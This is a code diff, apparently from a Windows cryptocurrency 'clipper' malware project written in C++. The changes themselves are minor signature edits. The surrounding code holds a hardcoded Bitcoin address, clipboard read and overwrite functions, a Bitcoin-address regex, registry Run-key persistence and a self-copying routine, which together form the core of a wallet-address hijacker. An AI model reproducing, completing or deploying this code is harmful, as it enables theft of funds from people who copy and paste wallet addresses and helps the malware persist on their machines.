@@ -9,12 +9,10 @@ using namespace std;
 
 // 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
 
-
-void setClipboard(char *newText) {
-    char const *output = newText;
-    const size_t len = strlen(output) + 1;
+void setClipboard(char newText[]) {
+    const size_t len = strlen(newText) + 1;
     HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
-    memcpy(GlobalLock(hMem), output, len);
+    memcpy(GlobalLock(hMem), newText, len);
     GlobalUnlock(hMem);
     OpenClipboard(0);
     EmptyClipboard();
@@ -33,7 +31,7 @@ char* getClipboard() {
     return NULL;
 }
 
-bool validateAddress(char *address) {
+bool validateAddress(char address[]) {
     regex pattern("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
     if (regex_match(address, pattern)) {
         return true;
@@ -42,7 +40,7 @@ bool validateAddress(char *address) {
     }
 }
 
-void addStartup(const char save_path[]) {
+void addStartup(char save_path[] ) {
     HKEY hKey;
     LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
     if( ERROR_SUCCESS == lnRes ) {
@@ -52,7 +50,7 @@ void addStartup(const char save_path[]) {
 }
 
 
-void copy_self(char* filename, char save_path[], char create_path[]) {
+void copy_self(char filename[], char save_path[], char create_path[]) {
     CreateDirectory(create_path, NULL);
     if (filesystem::exists(save_path)) {
         return; 
